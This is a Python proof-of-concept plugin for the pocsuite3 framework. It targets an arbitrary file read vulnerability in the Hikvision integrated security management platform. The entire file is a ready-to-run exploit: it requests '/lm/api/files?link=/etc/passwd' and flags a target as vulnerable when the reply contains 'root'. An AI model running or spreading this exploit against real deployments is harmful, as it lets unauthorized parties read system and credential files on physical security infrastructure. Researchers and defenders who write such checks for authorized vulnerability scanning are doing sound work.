# _*_ coding:utf-8 _*_
# @Time : 2024/1/25
# @Author: 炼金术师诸葛亮
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class Hikvision_files_fileread(POCBase):
    pocDesc = '''Hikvision综合安防管理平台files;.css接口存在任意文件读取漏洞'''
    author = '炼金术师诸葛亮'
    createDate = '2024-1-25'
    name = 'Hikvision综合安防管理平台files;.css接口存在任意文件读取漏洞'
    #	body="/portal/skin/isee/redblack/"

    def _verify(self):

        result = {}
        url = self.url+ '/lm/api/files?link=/etc/passwd'
        headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            'Connection': 'Keep-Alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1'
        }


        try:


            response = requests.post(url,headers=headers)
            if response.status_code == 200 and 'root' in response.text:
                result['VerifyInfo'] = {}


            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(Hikvision_files_fileread)
